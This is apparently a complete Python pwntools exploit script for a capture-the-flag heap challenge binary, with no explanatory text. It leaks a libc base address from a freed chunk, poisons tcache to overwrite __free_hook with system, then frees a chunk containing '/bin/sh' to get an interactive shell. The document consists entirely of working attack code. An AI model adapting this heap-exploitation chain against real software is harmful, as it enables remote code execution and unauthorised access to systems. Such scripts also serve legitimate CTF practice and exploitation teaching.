#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *
from pwncli import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)


def cmd(choice):
    ru(b">\n")
    sl(i2b(choice))


def add(choice, size):
    cmd(choice)
    cmd(1)
    ru(b"Enter the size of your item:\n")
    sl(i2b(size))


def delet(choice, idx):
    cmd(choice)
    cmd(2)
    ru(b"Enter the item you want to remove:\n")
    sl(i2b(idx))


def edit(choice, idx, size, data):
    cmd(choice)
    cmd(3)
    ru(b"Enter the item you want to modify:\n")
    sl(i2b(idx))
    if choice == 2:
        ru(
            b"Enter the key number you want to use to securely store the content with:\n"
        )
        sl(i2b(0))
    ru(b"Enter the size of the content:\n")
    sl(i2b(size))
    ru(b"Enter the content:\n")
    s(data)


def show(choice, idx):
    cmd(choice)
    cmd(4)
    ru(b"Enter the item you want to show:\n")
    sl(i2b(idx))
    ru(b": \n")


add(1, 0x20)
edit(1, 0, 0x20 - 1, b"a" * 8)
add(2, 0x520)
add(2, 0x520)
delet(2, 0)
show(2, 0)
libc_base = u64_ex(rn(6)) - 0x1ECBE0
lg_suc(hex(libc_base))

add(2, 0x80)  # 2
add(2, 0x80)
add(2, 0x80)

delet(2, 3)
delet(2, 4)
edit(2, 2, 0x80 - 1, p64(libc_base + libc.sym.__free_hook))

show(2, 2)
tmp_data = ru(b"Do you want to work with keys or content?", drop=True)
edit(2, 4, 0x80 - 1, tmp_data)

add(2, 0x80)
add(2, 0x80)  # 6
edit(2, 5, 0x80 - 1, p64(libc_base + libc.sym.system))
show(2, 5)
tmp_data = ru(b"Do you want to work with keys or content?", drop=True)
edit(2, 6, 0x80 - 1, tmp_data)

edit(1, 0, 0x20 - 1, b"/bin/sh\x00")
delet(1, 0)


ia()
